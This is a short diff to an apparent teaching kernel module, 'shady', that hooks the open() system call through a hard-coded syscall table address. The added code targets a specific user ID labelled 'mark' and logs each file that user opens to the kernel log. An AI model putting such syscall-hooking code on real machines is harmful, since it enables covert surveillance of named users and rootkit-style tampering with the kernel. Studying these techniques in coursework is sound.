@@ -48,8 +48,9 @@ module_param(shady_ndevices, int, S_IRUGO);
 static unsigned int shady_major = 0;
 static struct shady_dev *shady_devices = NULL;
 static struct class *shady_class = NULL;
-//hard-coded address
+//hard-coded values
 void **system_call_table_address = (void *)0xffffffff81801400;
+int marks_uid = 1001;
 /* ================================================================ */
 
 int 
@@ -220,6 +221,10 @@ asmlinkage int (*old_open) (const char*, int, int);
 asmlinkage int my_open (const char* file, int flags, int mode)
 {
    /* YOUR CODE HERE */
+  if(current_uid() == marks_uid)
+  {
+    printk("mark is about to open %s\n", file);
+  }
   printk("my_open called");
   return old_open(file, flags, mode);
 }
